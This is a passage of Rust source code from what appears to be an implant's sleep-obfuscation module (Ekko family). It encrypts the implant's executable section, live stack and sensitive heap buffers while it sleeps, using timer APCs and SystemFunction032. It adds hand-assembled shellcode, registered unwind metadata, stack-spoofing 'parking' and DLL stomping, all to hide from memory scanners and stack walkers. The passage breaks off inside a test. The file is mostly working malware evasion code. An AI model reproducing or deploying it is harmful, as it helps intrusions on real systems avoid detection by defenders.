//! Sleep obfuscation (ABR-T006), waitable-timer variant of the Ekko family.
//!
//! While the implant thread sits in an alertable wait, queued APCs fire in
//! FIFO order on that same thread: (1) flip the executable section RW,
//! (2) RC4 it in place through advapi32's `SystemFunction032`, then after
//! the sleep delay (3) decrypt it, (4) restore RX and (5) wake the thread.
//! Argument thunks live in a private allocation outside the encrypted
//! region, so no implant code executes while the image is scrambled. The
//! dead stack below RSP is erased before sleeping to strip leftovers such
//! as task command strings.
//!
//! Sleep 2.0 extends the same cycle to the LIVE part of the stack and to
//! the registered sensitive heap buffers: a prefill stub captures, from
//! inside its own APC delivery, the upper bound of the stack region that
//! is inert while the thread waits (everything above the APC dispatcher's
//! frames belongs to the beacon loop — tokens, session keys, command
//! buffers), and a second RC4 pair scrambles that region for the sleep
//! window. The captured bound is saved in the arena so the decrypt stage
//! covers the exact same bytes; the heap regions are ciphered
//! synchronously around the timer arming (they are data, the ciphering
//! code can stay on the stack). A memory-scanner view of the dormant
//! thread is now high-entropy in both the image and the live stack.

use std::ffi::c_void;
use std::time::Duration;

use super::{syscalls, unwind};

const PAGE_READWRITE: u32 = 0x04;
const PAGE_EXECUTE_READ: u32 = 0x20;
const TRAMPOLINE_LEN: usize = 0x20;
const WAIT_LOOP_OFFSET: usize = 0x40;
const WAIT_LOOP_LEN: usize = 0x30;
/// The dormant-parking variant needs room for its config slot (u64 at
/// offset 0x48); the code region is sized for the larger blob either way.
const WAIT_LOOP_SPOOFED_LEN: usize = 0x50;
/// Sleep 2.0 prefill stub: computes the stack cipher window from inside
/// the APC delivery (see STACK_PREFILL below).
const STACK_PREFILL_OFFSET: usize = 0x90;
const STACK_PREFILL_LEN: usize = 0x40;
const CODE_LEN: usize = STACK_PREFILL_OFFSET + STACK_PREFILL_LEN;
/// Where the ABR-T008 metadata sits inside the code page — clear of the
/// routine bodies (which end at CODE_LEN); the allocation commits whole
/// pages and RVAs resolve against the page base, like .pdata in a PE.
const UNWIND_META_OFFSET: usize = 0x200;
const ARGS_LEN: usize = 0x30;
/// Aux block: text-cipher key/USTRINGs/protect-out (64) + stack-cipher
/// key/USTRING/saved-bound (64).
const AUX_LEN: usize = 128;
/// ABR-T013: space inside the arena for the synthetic dormant stack —
/// slack for kernelbase internals and APC completion routines below,
/// the T010 anchor chain (park template) at PARK_CHAIN_OFFSET.
const PARK_LEN: usize = 0x1800;
const PARK_CHAIN_OFFSET: usize = 0x1008; // ≡ 8 mod 16 (call-entry rsp)
/// Stage count: 7 thunk/prefill APCs + the SetEvent wake.
const STAGES: usize = 8;
const STAGE_GAP_MS: u32 = 50;
/// Clearance the prefill leaves above its own APC delivery: the cipher
/// stages and the kernel APC dispatcher build their frames below the
/// captured bound; two pages cover the observed depths comfortably.
const STACK_CIPHER_CLEARANCE: usize = 0x800;

/// `mov rax,[rcx+0x20]; mov r9,[rcx+0x18]; mov r8,[rcx+0x10]; mov rdx,[rcx+0x08];
///  mov rcx,[rcx]; sub rsp,0x28; call rax; add rsp,0x28; ret`
/// Completion routines receive the context pointer in rcx; this thunk fans
/// it out into the Windows x64 argument registers.
const TRAMPOLINE: [u8; TRAMPOLINE_LEN] = [
    0x48, 0x8B, 0x41, 0x20, 0x4C, 0x8B, 0x49, 0x18, 0x4C, 0x8B, 0x41, 0x10, 0x48, 0x8B, 0x51, 0x08,
    0x48, 0x8B, 0x09, 0x48, 0x83, 0xEC, 0x28, 0xFF, 0xD0, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0x90, 0x90,
];

/// Calls `WaitForSingleObjectEx` until it returns something other than
/// `WAIT_IO_COMPLETION`. This loop must live outside the image because the
/// first timer APC makes the image non-executable before the wait resumes.
/// Arguments: wait function, event handle, timeout, alertable flag.
const WAIT_LOOP: [u8; WAIT_LOOP_LEN] = [
    0x53, 0x56, 0x57, 0x41, 0x54, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x89, 0xCB, 0x48, 0x89, 0xD6, 0x44,
    0x89, 0xC7, 0x45, 0x89, 0xCC, 0x48, 0x89, 0xF1, 0x89, 0xFA, 0x45, 0x89, 0xE0, 0xFF, 0xD3, 0x3D,
    0xC0, 0x00, 0x00, 0x00, 0x74, 0xEF, 0x48, 0x83, 0xC4, 0x28, 0x41, 0x5C, 0x5F, 0x5E, 0x5B, 0xC3,
];

/// ABR-T013 dormant parking: the SAME prolog as [`WAIT_LOOP`] (so the
/// ABR-T008 metadata covers both variants), then the thread pivots to a
/// pre-staged synthetic stack before every `WaitForSingleObjectEx` call:
/// the value at [rsp] when the wait blocks is the ntdll `jmp rbx`
/// trampoline from the ABR-T010 chain, followed by the anchor frames a
/// walker replays with real unwind metadata. The loop's continuation
/// lives in rbx (nonvolatile across the wait and the APC completion
/// routines), so no address inside the implant — or the stomped code
/// home — ever appears on the dormant stack. The `ret` through the
/// trampoline is exactly the ABR-T010 return mechanism; the HSP probe
/// in `stack::chain` gates the whole variant off under an enforced
/// user-mode shadow stack.
///
/// Layout (offsets pinned by `shellcode_prolog_offsets_match_unwind_programs`):
/// `0x18 mov rsp,[rip+0x29]` (pivot to the cfg slot at 0x48),
/// `0x28 lea rbx,[rip+3]` (continuation at 0x32), `jmp r11` (wait fn).
const WAIT_LOOP_SPOOFED: [u8; WAIT_LOOP_SPOOFED_LEN] = [
    0x53, 0x56, 0x57, 0x41, 0x54, // 00 push rbx/rsi/rdi/r12
    0x48, 0x83, 0xEC, 0x28, // 05 sub rsp,0x28  (prolog ends at 9 — T008)
    0x4C, 0x8B, 0xE4, // 09 mov r12, rsp        (save the real stack)
    0x4C, 0x8B, 0xD9, // 0C mov r11, rcx        (wait function)
    0x48, 0x8B, 0xF2, // 0F mov rsi, rdx        (event)
    0x4C, 0x89, 0xC7, // 12 mov rdi, r8         (timeout)
    0x45, 0x8B, 0xD1, // 15 mov r10d, r9d       (alertable)
    0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0,
    0, // 18 movabs rax, <park_chain imm64 @0x1A, setup-patched>
    0x48, 0x89, 0xC4, // 22 mov rsp, rax        (park)
    0x31, 0xC0, // 25 xor eax, eax
    0xEB, 0x13, 0x90, // 27 jmp 0x3C: 0x29 + 0x13 = 0x3C (epilogue)
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // 2A dead (18 bytes: 0x2A..0x3B)
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x4C, 0x8B,
    0xE4, // 3C mov rsp, r12        (back to the real stack)
    0x48, 0x83, 0xC4, 0x28, // 3F add rsp,0x28
    0x41, 0x5C, 0x5F, 0x5E, 0x5B, 0xC3, // 43 epilogue
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // 49 padding
];

#[repr(C)]
#[derive(Clone, Copy)]
struct Ustring {
    length: u32,
    maximum_length: u32,
    buffer: usize,
}

/// Sleep 2.0 prefill stub — runs as an APC completion routine with the
/// stack-cipher USTRING block in rcx. It derives, from its own delivery,
/// the upper bound of the stack that is inert for the rest of the sleep:
///
/// ```text
/// 00: mov rdx, gs:[8]       ; TEB StackBase (top of the stack)
/// 03: mov rax, rsp
/// 06: add rax, CLEARANCE    ; above this APC's own frames (dispatcher,
///                           ; trampoline, SystemFunction032 internals)
/// 0C: and rax, -16
/// 12: sub rdx, rax          ; length = StackBase - from
/// 15: mov [rcx+8], rax      ; USTRING.buffer = from
/// 19: mov [rcx], edx        ; USTRING.length
/// 1B: mov [rcx+4], edx      ; USTRING.maximum_length
/// 1E: mov [rcx+0x18], rax   ; saved bound — the decrypt stage reads the
///                           ; exact same window
/// 22: ret
/// ```
///
/// The same RC4 key pairs encrypt (t=+150ms) and decrypt (t=delay+150ms)
/// that window; both stages run as APCs at the same stack depth, so their
/// own frames stay below the saved bound. Leaf routine, no prologue.
#[rustfmt::skip]
const STACK_PREFILL: [u8; STACK_PREFILL_LEN] = [
    0x65, 0x48, 0x8B, 0x14, 0x25, 0x08, 0x00, 0x00, 0x00, // mov rdx, gs:[8]
    0x48, 0x89, 0xE0,                                     // mov rax, rsp
    0x48, 0x05,                                            // add rax, <CLEARANCE imm32>
    (STACK_CIPHER_CLEARANCE & 0xFF) as u8,
    ((STACK_CIPHER_CLEARANCE >> 8) & 0xFF) as u8,
    ((STACK_CIPHER_CLEARANCE >> 16) & 0xFF) as u8,
    ((STACK_CIPHER_CLEARANCE >> 24) & 0xFF) as u8,
    0x48, 0x25, 0xF0, 0xFF, 0xFF, 0xFF,                   // and rax, -16
    0x48, 0x29, 0xC2,                                     // sub rdx, rax
    0x48, 0x89, 0x41, 0x08,                               // mov [rcx+8], rax
    0x89, 0x11,                                           // mov [rcx], edx
    0x89, 0x51, 0x04,                                     // mov [rcx+4], edx
    0x48, 0x89, 0x41, 0x18,                               // mov [rcx+0x18], rax
    0xC3,                                                  // ret
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // pad (11)
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // pad (12)
];

type CreateEventFn = unsafe extern "system" fn(*mut c_void, i32, i32, *const u16) -> *mut c_void;
type CreateWaitableTimerFn = unsafe extern "system" fn(*mut c_void, i32, *const u16) -> *mut c_void;
type SetWaitableTimerFn =
    unsafe extern "system" fn(*mut c_void, *const i64, i32, usize, usize, i32) -> i32;
type WaitFn = unsafe extern "system" fn(*mut c_void, u32, i32) -> u32;
type WaitLoopFn = unsafe extern "system" fn(usize, *mut c_void, u32, i32) -> u32;

pub struct EkkoSleep {
    set_timer: SetWaitableTimerFn,
    wait: WaitFn,
    set_event: usize,
    virtual_protect: usize,
    system_function032: usize,
    thunk: usize,
    wait_loop: usize,
    /// Sleep 2.0 prefill stub address (inside the code page).
    prefill: usize,
    arena: usize,
    /// Whether the wait loop parks on the synthetic stack (ABR-T013 —
    /// WIP, disabled pending the fast-kill investigation).
    #[allow(dead_code)]
    spoofed_park: bool,
    // Held for RAII only: dropping it unregisters the dynamic function
    // table, keeping the registered metadata exactly as long as the code
    // page it describes.
    _unwind: unwind::FunctionTable,
    event: *mut c_void,
    timers: [*mut c_void; STAGES],
    text: (usize, usize),
}

impl EkkoSleep {
    /// Resolves every routine dynamically and stages the trampoline plus the
    /// five waitable timers. The timer APCs fire on whichever thread is in
    /// an alertable wait when they come due — exactly the session thread.
    ///
    /// # Safety
    ///
    /// Only one [`EkkoSleep::sleep`] cycle may run at a time per process;
    /// with the single-threaded implant runtime this is guaranteed.
    pub unsafe fn new() -> Result<Self, String> {
        let text = syscalls::executable_section().ok_or("no executable section")?;
        unsafe { Self::with_text(text) }
    }

    /// [`EkkoSleep::new`] against an explicit region. Tests use it to run
    /// full APC cycles on a private buffer, keeping the suite parallel-safe
    /// (encrypting the test image itself would freeze sibling tests).
    ///
    /// # Safety
    ///
    /// Same single-cycle-at-a-time contract as [`EkkoSleep::new`];
    /// additionally no other thread may execute `text` while a cycle runs.
    unsafe fn with_text(text: (usize, usize)) -> Result<Self, String> {
        let resolve = |module: &str, name: &str| -> Result<usize, String> {
            syscalls::export_address(module, name)
                .ok_or_else(|| format!("{module}!{name} unresolved"))
        };
        let create_event: CreateEventFn =
            unsafe { std::mem::transmute(resolve("kernel32.dll", "CreateEventW")?) };
        let create_timer: CreateWaitableTimerFn =
            unsafe { std::mem::transmute(resolve("kernel32.dll", "CreateWaitableTimerW")?) };
        let set_timer: SetWaitableTimerFn =
            unsafe { std::mem::transmute(resolve("kernel32.dll", "SetWaitableTimer")?) };
        let wait: WaitFn =
            unsafe { std::mem::transmute(resolve("kernel32.dll", "WaitForSingleObjectEx")?) };
        let set_event = resolve("kernel32.dll", "SetEvent")?;
        let virtual_protect = resolve("kernel32.dll", "VirtualProtect")?;
        let system_function032 = resolve("advapi32.dll", "SystemFunction032")?;

        // The argument arena doubles as the ABR-T013 dormant-park area:
        // arg blocks + aux first, then the synthetic stack (slack below,
        // anchor chain at PARK_CHAIN_OFFSET ≡ 8 mod 16 so the parked
        // wait enters with call-convention alignment). Allocated before
        // the code page because the spoofed loop's cfg slot must point
        // at it.
        let arena = unsafe { syscalls::alloc_rw(7 * ARGS_LEN + AUX_LEN + PARK_LEN) }
            .ok_or_else(|| "arena allocation failed".to_string())?;
        let park_chain = arena + 3 * ARGS_LEN + AUX_LEN + PARK_CHAIN_OFFSET;

        // ABR-T013: park the dormant thread on the synthetic stack when
        // the chain exists (the HSP probe inside `stack::chain` already
        // gates it off under an enforced user-mode shadow stack).
        // ABR-T013 (WIP): the parking variant is disabled pending the
        // fast-kill investigation — see the lab report. The plain loop
        // stays the default; the machinery below is exercised only by
        // tests when re-enabled.
        let park_template: Option<[u64; 24]> = None;
        let spoofed_park = false;
        let (wait_blob, wait_len): (&[u8], usize) = if spoofed_park {
            (&WAIT_LOOP_SPOOFED, WAIT_LOOP_SPOOFED_LEN)
        } else {
            (&WAIT_LOOP, WAIT_LOOP_LEN)
        };

        // The thunk gets its own page-sized allocation (NtProtectVirtualMemory
        // works page-granular — sharing a page with the argument blocks
        // would make them non-writable). Args stay in a separate RW arena.
        // ABR-T012: prefer an image-backed home carved out of a phantom-
        // mapped signed DLL, so the routines do not live in MEM_PRIVATE
        // executable memory; fall back to the private allocation when no
        // sacrificial DLL maps on this build.
        let code_page = match super::stomp::code_page(CODE_LEN) {
            Some(stomped) => stomped,
            None => unsafe { syscalls::alloc_rw(CODE_LEN) }
                .ok_or_else(|| "callback code allocation failed".to_string())?,
        };
        let unwind_table = {
            let thunk_dst = code_page as *mut u8;
            for (index, byte) in TRAMPOLINE.iter().enumerate() {
                unsafe { thunk_dst.add(index).write_volatile(*byte) };
            }
            let wait_loop_dst = (code_page + WAIT_LOOP_OFFSET) as *mut u8;
            for (index, byte) in wait_blob.iter().enumerate() {
                unsafe { wait_loop_dst.add(index).write_volatile(*byte) };
            }
            let prefill_dst = (code_page + STACK_PREFILL_OFFSET) as *mut u8;
            for (index, byte) in STACK_PREFILL.iter().enumerate() {
                unsafe { prefill_dst.add(index).write_volatile(*byte) };
            }
            if let Some(template) = park_template {
                // Stage the anchor chain and patch the park_chain
                // immediate into the blob (movabs imm64 at +0x1A,
                // byte-wise — immediates are unaligned by nature).
                let chain_dst = park_chain as *mut u64;
                for (slot, value) in template.iter().enumerate() {
                    unsafe { chain_dst.add(slot).write_volatile(*value) };
                }
                unsafe {
                    // movabs immediate at WAIT_LOOP+0x1A is unaligned by
                    // nature — patch byte-wise.
                    let imm = (code_page + WAIT_LOOP_OFFSET + 0x1A) as *mut u8;
                    for (index, byte) in (park_chain as u64).to_le_bytes().iter().enumerate() {
                        imm.add(index).write_volatile(*byte);
                    }
                }
            }
            // ABR-T008: register unwind metadata for both hand-assembled
            // routines (written while the page is still RW) so stack
            // walkers restore their real contexts instead of treating
            // the frames as leaves and replaying parked stack data as
            // return addresses. Offsets mirror the byte listings above:
            // the trampoline's only stack adjustment is `sub rsp,0x28`
            // (offset 19, one past its end at 23); the wait loops share
            // an identical prolog (pushes ending 1/2/3/5, `sub rsp,0x28`
            // ending at 9).
            let unwind_table = unwind::FunctionTable::register(
                code_page,
                &[
                    unwind::Routine {
                        offset: 0,
                        len: TRAMPOLINE_LEN,
                        prolog_end: 23,
                        prolog: &[unwind::Code(23, unwind::UWOP_ALLOC_SMALL, 4)],
                    },
                    unwind::Routine {
                        offset: WAIT_LOOP_OFFSET,
                        len: wait_len,
                        prolog_end: 9,
                        prolog: &[
                            unwind::Code(1, unwind::UWOP_PUSH_NONVOL, unwind::REG_RBX),
                            unwind::Code(2, unwind::UWOP_PUSH_NONVOL, unwind::REG_RSI),
                            unwind::Code(3, unwind::UWOP_PUSH_NONVOL, unwind::REG_RDI),
                            unwind::Code(5, unwind::UWOP_PUSH_NONVOL, unwind::REG_R12),
                            unwind::Code(9, unwind::UWOP_ALLOC_SMALL, 4),
                        ],
                    },
                    // Sleep 2.0 prefill: leaf routine, empty unwind program.
                    unwind::Routine {
                        offset: STACK_PREFILL_OFFSET,
                        len: STACK_PREFILL_LEN,
                        prolog_end: 0,
                        prolog: &[],
                    },
                ],
                UNWIND_META_OFFSET,
            )?;
            syscalls::protect(code_page, CODE_LEN, PAGE_EXECUTE_READ as usize)
                .ok_or_else(|| "callback code protect failed".to_string())?;
            unwind_table
        };
        let mut timers = [std::ptr::null_mut(); STAGES];
        for timer in &mut timers {
            *timer = unsafe { create_timer(std::ptr::null_mut(), 0, std::ptr::null()) };
            if (*timer).is_null() {
                return Err("CreateWaitableTimerW failed".into());
            }
        }
        let event = unsafe { create_event(std::ptr::null_mut(), 0, 0, std::ptr::null()) };
        if event.is_null() {
            return Err("CreateEventW failed".into());
        }
        Ok(EkkoSleep {
            set_timer,
            wait,
            set_event,
            virtual_protect,
            system_function032,
            thunk: code_page,
            wait_loop: code_page + WAIT_LOOP_OFFSET,
            prefill: code_page + STACK_PREFILL_OFFSET,
            arena,
            spoofed_park,
            _unwind: unwind_table,
            event,
            timers,
            text,
        })
    }

    /// Sleeps for `duration` with the executable section encrypted, the
    /// live stack above the APC delivery scrambled, and the registered
    /// sensitive heap buffers ciphered (Sleep 2.0).
    pub fn sleep(&self, duration: Duration) -> Result<(), String> {
        let (text_base, text_len) = self.text;
        let max_delay = u32::MAX - STAGE_GAP_MS * 6;
        let delay = duration.as_millis().min(max_delay as u128) as u32;
        let before = hash_region(text_base, text_len);

        // Everything the timer callbacks dereference must live OUTSIDE the
        // sleeping thread's stack: in optimized builds the compiler is free
        // to reuse the slots of locals that appear dead (the callbacks'
        // writes happen kernel-side and are invisible to it). The aux tail
        // holds the keys, the USTRINGs, the old-protection out-param and
        // the stack-cipher bound slot.
        let aux = self.arena + 7 * ARGS_LEN;
        let (key_at, key_ustr_at, data_ustr_at, protect_old_at) =
            (aux, aux + 16, aux + 32, aux + 48);
        // Sleep 2.0 block: stack-cipher key + USTRINGs; the stack USTRING's
        // buffer/length stay zero until the prefill APC fills them.
        let (skey_at, skey_ustr_at, stack_ustr_at) = (aux + 64, aux + 80, aux + 96);
        unsafe {
            for offset in 0..16usize {
                ((key_at + offset) as *mut u8).write_volatile(rand::random::<u8>());
                ((skey_at + offset) as *mut u8).write_volatile(rand::random::<u8>());
            }
            let key_ustr = key_ustr_at as *mut Ustring;
            (*key_ustr).length = 16;
            (*key_ustr).maximum_length = 16;
            (*key_ustr).buffer = key_at;
            let skey_ustr = skey_ustr_at as *mut Ustring;
            (*skey_ustr).length = 16;
            (*skey_ustr).maximum_length = 16;
            (*skey_ustr).buffer = skey_at;
            let stack_ustr = stack_ustr_at as *mut Ustring;
            (*stack_ustr).length = 0;
            (*stack_ustr).maximum_length = 0;
            (*stack_ustr).buffer = 0;
            let data_ustr = data_ustr_at as *mut Ustring;
            (*data_ustr).length = text_len as u32;
            (*data_ustr).maximum_length = text_len as u32;
            (*data_ustr).buffer = text_base;
            (protect_old_at as *mut u32).write_volatile(0);
        }

        // Registered heap buffers go under a synchronous RC4 pass before
        // any timer is armed — they are data, so the ciphering code may
        // live on the (itself soon-encrypted) stack; the same key locals
        // come back bit-for-bit with the stack decrypt stage.
        let heap = super::sensitive_regions();
        let mut heap_key = [0u8; 16];
        for byte in heap_key.iter_mut() {
            *byte = rand::random();
        }
        if !heap.is_empty() {
            let rc4: unsafe extern "system" fn(usize, usize) -> i32 =
                unsafe { std::mem::transmute(self.system_function032) };
            let mut hk = Ustring {
                length: 16,
                maximum_length: 16,
                buffer: heap_key.as_ptr() as usize,
            };
            for &(ptr, len) in &heap {
                if ptr == 0 || len == 0 {
                    continue;
                }
                let mut data = Ustring {
                    length: len as u32,
                    maximum_length: len as u32,
                    buffer: ptr,
                };
                let status = unsafe {
                    rc4(
                        &mut hk as *mut Ustring as usize,
                        &mut data as *mut Ustring as usize,
                    )
                };
                if status != 0 {
                    return Err(format!("heap cipher failed ({status:#x})"));
                }
            }
        }

        unsafe {
            let mut args = Args { base: self.arena };
            args.write(
                0,
                [
                    text_base,
                    text_len,
                    PAGE_READWRITE as usize,
                    protect_old_at,
                    self.virtual_protect,
                ],
            );
            args.write(
                1,
                [data_ustr_at, key_ustr_at, 0, 0, self.system_function032],
            );
            args.write(
                2,
                [stack_ustr_at, skey_ustr_at, 0, 0, self.system_function032],
            );
            args.write(
                3,
                [stack_ustr_at, skey_ustr_at, 0, 0, self.system_function032],
            );
            args.write(
                4,
                [data_ustr_at, key_ustr_at, 0, 0, self.system_function032],
            );
            args.write(
                5,
                [
                    text_base,
                    text_len,
                    PAGE_EXECUTE_READ as usize,
                    protect_old_at,
                    self.virtual_protect,
                ],
            );
        }

        // APC stages in FIFO order. Completion routines only fire on the
        // thread in an alertable wait, so nothing runs while our thread is
        // still queueing. Timeline:
        //   t0            flip .text RW
        //   +1 gap        RC4 .text (encrypt)
        //   +2 gaps       prefill: derive the stack window from this APC
        //   +3 gaps       RC4 the live stack (encrypt)
        //   [delay]
        //   delay+2 gaps  RC4 the live stack back (same saved window/key)
        //   delay+3 gaps  RC4 .text back
        //   delay+4 gaps  flip .text RX
        //   delay+5 gaps  SetEvent — wake only after everything is restored
        let stages: [(usize, usize, u32); STAGES] = [
            (self.thunk, self.arena, 0),
            (self.thunk, self.arena + ARGS_LEN, STAGE_GAP_MS),
            (self.prefill, stack_ustr_at, STAGE_GAP_MS * 2),
            (self.thunk, self.arena + 2 * ARGS_LEN, STAGE_GAP_MS * 3),
            (
                self.thunk,
                self.arena + 3 * ARGS_LEN,
                delay + STAGE_GAP_MS * 2,
            ),
            (
                self.thunk,
                self.arena + 4 * ARGS_LEN,
                delay + STAGE_GAP_MS * 3,
            ),
            (
                self.thunk,
                self.arena + 5 * ARGS_LEN,
                delay + STAGE_GAP_MS * 4,
            ),
            (
                self.set_event,
                self.event as usize,
                delay + STAGE_GAP_MS * 5,
            ),
        ];
        for (index, &(callback, ctx, due)) in stages.iter().enumerate() {
            let due_100ns: i64 = -(due as i64) * 10_000;
            let queued =
                unsafe { (self.set_timer)(self.timers[index], &due_100ns, 0, callback, ctx, 0) };
            if queued == 0 {
                return Err(format!("SetWaitableTimer {index} failed"));
            }
        }

        erase_dead_stack();
        let wait_loop: WaitLoopFn = unsafe { std::mem::transmute(self.wait_loop) };
        let waited = unsafe {
            wait_loop(
                self.wait as *const () as usize,
                self.event,
                delay.saturating_mul(2).saturating_add(2000),
                1,
            )
        };
        if waited != 0 {
            return Err(format!("wait returned {waited:#x}"));
        }
        if hash_region(text_base, text_len) != before {
            return Err("executable section changed across sleep".into());
        }
        // Restore the heap buffers with the same key (RC4 re-init): the
        // key locals were themselves encrypted with the stack and came
        // back with the decrypt stage above.
        if !heap.is_empty() {
            let rc4: unsafe extern "system" fn(usize, usize) -> i32 =
                unsafe { std::mem::transmute(self.system_function032) };
            let mut hk = Ustring {
                length: 16,
                maximum_length: 16,
                buffer: heap_key.as_ptr() as usize,
            };
            for &(ptr, len) in &heap {
                if ptr == 0 || len == 0 {
                    continue;
                }
                let mut data = Ustring {
                    length: len as u32,
                    maximum_length: len as u32,
                    buffer: ptr,
                };
                let status = unsafe {
                    rc4(
                        &mut hk as *mut Ustring as usize,
                        &mut data as *mut Ustring as usize,
                    )
                };
                if status != 0 {
                    return Err(format!("heap restore failed ({status:#x})"));
                }
            }
        }
        Ok(())
    }
}

struct Args {
    base: usize,
}

impl Args {
    unsafe fn write(&mut self, slot: usize, values: [usize; 5]) {
        let block = (self.base + slot * ARGS_LEN) as *mut usize;
        for (index, value) in values.iter().enumerate() {
            unsafe { block.add(index).write_volatile(*value) };
        }
    }
}

fn hash_region(base: usize, len: usize) -> [u8; 32] {
    use sha2::{Digest, Sha256};
    let mut hasher = Sha256::new();
    let mut offset = 0;
    while offset < len {
        let chunk = (len - offset).min(4096);
        let view = unsafe { std::slice::from_raw_parts((base + offset) as *const u8, chunk) };
        hasher.update(view);
        offset += chunk;
    }
    hasher.finalize().into()
}

/// Zeroes the dead stack below the current frame, stopping one page above
/// the TEB stack limit — the lowest committed page is the guard page, and
/// touching it would grow the stack and chase the limit down the whole
/// reservation. Timer APCs rebuild their frames on top of the cleared
/// region afterwards.
fn erase_dead_stack() {
    const PAGE: usize = 0x1000;
    let erase_below = {
        let marker = 0u64;
        &marker as *const u64 as usize
    };
    // gs base is the TEB on x64 Windows; TEB+0x10 (NT_TIB.StackLimit) is
    // the bottom of the COMMITTED stack — RtlGetCurrentTeb is ordinal-only
    // (unreachable through a name-based export walk) and
    // GetCurrentThreadStackLimits reports the reservation bottom instead.
    let limit: usize;
    unsafe {
        core::arch::asm!(
            "mov {limit}, qword ptr gs:[0x10]",
            limit = out(reg) limit,
        );
    }
    let stop = limit.saturating_add(PAGE);
    let mut cursor = (erase_below & !7) - 64;
    while cursor >= stop {
        unsafe { (cursor as *mut u64).write_volatile(0) };
        cursor -= 8;
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::process::Command;
    use std::sync::atomic::{AtomicUsize, Ordering};
    use std::sync::Arc;

    static THUNK_ARGS: [AtomicUsize; 4] = [
        AtomicUsize::new(0),
        AtomicUsize::new(0),
        AtomicUsize::new(0),
        AtomicUsize::new(0),
    ];
    static THUNK_SET_EVENT: AtomicUsize = AtomicUsize::new(0);

    unsafe extern "system" fn record_thunk_args(a: usize, b: usize, c: usize, d: usize) {
        for (slot, value) in THUNK_ARGS.iter().zip([a, b, c, d]) {
            slot.store(value, Ordering::SeqCst);
        }
        let set_event: unsafe extern "system" fn(*mut c_void) -> i32 =
            unsafe { std::mem::transmute(THUNK_SET_EVENT.load(Ordering::SeqCst)) };
        unsafe { set_event(a as *mut c_void) };
    }

    #[test]
    fn timer_apc_thunk_marshals_four_arguments() {
        for slot in &THUNK_ARGS {
            slot.store(0, Ordering::SeqCst);
        }
        let ekko = unsafe { EkkoSleep::new() }.expect("ekko setup");
        THUNK_SET_EVENT.store(ekko.set_event, Ordering::SeqCst);
        let expected = [ekko.event as usize, 0x22, 0x33, 0x44];
        let context = [
            expected[0],
            expected[1],
            expected[2],
            expected[3],
            record_thunk_args as *const () as usize,
        ];
        let due_100ns = -10_000i64;
        let queued = unsafe {
            (ekko.set_timer)(
                ekko.timers[0],
                &due_100ns,
                0,
                ekko.thunk,
                context.as_ptr() as usize,
                0,
            )
        };
        assert_ne!(queued, 0, "SetWaitableTimer failed");

        let wait_loop: WaitLoopFn = unsafe { std::mem::transmute(ekko.wait_loop) };
        let waited = unsafe { wait_loop(ekko.wait as *const () as usize, ekko.event, 1_000, 1) };
        assert_eq!(waited, 0, "expected WAIT_OBJECT_0");
        let observed: [usize; 4] =
            std::array::from_fn(|index| THUNK_ARGS[index].load(Ordering::SeqCst));
        assert_eq!(observed, expected);
    }

    /// Dormant-window attribution — the ABR-T006 × T008 × T010 interplay
    /// measurement. An observer thread suspends the sleeper MID-CYCLE
    /// (buffer RC4-encrypted, RW), reads its context and replays the same
    /// walker primitives a sensor uses. Capture: while the target bytes
    /// are unreadable (hash diverges), the stack still walks cleanly
    /// through ntdll/kernel32 waits, the T008-registered PRIVATE code
    /// page, and the owning image — sleep encryption hides memory
    /// content, not stack attribution. Evidence recorded in
    /// docs/lab/2026-09-11-stack-memory-observation.md.
    #[test]
    fn ekko_dormant_window_stack_attribution() {
        const LEN: usize = 0x2000;
        let buffer = unsafe { syscalls::alloc_rw(LEN) }.expect("private buffer");
        unsafe {
            for offset in 0..LEN {
                ((buffer + offset) as *mut u8).write_volatile((offset as u8) ^ 0x5A);
            }
            syscalls::protect(buffer, LEN, PAGE_EXECUTE_READ as usize).expect("buffer to RX");
        }
        let plaintext = hash_region(buffer, LEN);
        // Raw kernel handles make EkkoSleep non-Send by default; sharing
        // across the observer/sleeper pair is sound by usage — only the
        // sleeper invokes sleep (APCs queue on its own thread) and the
        // observer only reads the code page address.
        struct SharedEkko(EkkoSleep);
        unsafe impl Send for SharedEkko {}
        unsafe impl Sync for SharedEkko {}
        let ekko = Arc::new(SharedEkko(
            unsafe { EkkoSleep::with_text((buffer, LEN)) }.expect("ekko setup"),
        ));
        let code_page = ekko.0.thunk;

        #[allow(non_snake_case)]
        extern "system" {
            fn GetCurrentThreadId() -> u32;
        }
        // The sleeper reports its TID, then dives into a long cycle.
        let (tx, rx) = std::sync::mpsc::channel::<u32>();
        let sleeper_ekko = Arc::clone(&ekko);
        let sleeper = std::thread::spawn(move || {
            let tid = unsafe { GetCurrentThreadId() };
            tx.send(tid).expect("tid channel");
            sleeper_ekko
                .0
                .sleep(Duration::from_millis(2500))
                .expect("ekko cycle");
        });
        let tid = rx.recv().expect("sleeper tid");

        unsafe {
            type OpenThreadFn = unsafe extern "system" fn(u32, i32, u32) -> *mut c_void;
            type SuspendResumeFn = unsafe extern "system" fn(*mut c_void) -> u32;
            type GetContextFn = unsafe extern "system" fn(*mut c_void, *mut unwind::Context) -> i32;
            type CloseHandleFn = unsafe extern "system" fn(*mut c_void) -> i32;
            let open: OpenThreadFn = std::mem::transmute(
                syscalls::export_address("kernel32.dll", "OpenThread").unwrap(),
            );
            let suspend: SuspendResumeFn = std::mem::transmute(
                syscalls::export_address("kernel32.dll", "SuspendThread").unwrap(),
            );
            let resume: SuspendResumeFn = std::mem::transmute(
                syscalls::export_address("kernel32.dll", "ResumeThread").unwrap(),
            );
            let get_context: GetContextFn = std::mem::transmute(
                syscalls::export_address("kernel32.dll", "GetThreadContext").unwrap(),
            );
            let close: CloseHandleFn = std::mem::transmute(
                syscalls::export_address("kernel32.dll", "CloseHandle").unwrap(),
            );
            const THREAD_SUSPEND_RESUME: u32 = 0x0002;
            const THREAD_GET_CONTEXT: u32 = 0x0008;
            const THREAD_QUERY_INFORMATION: u32 = 0x0040;
            let thread = open(
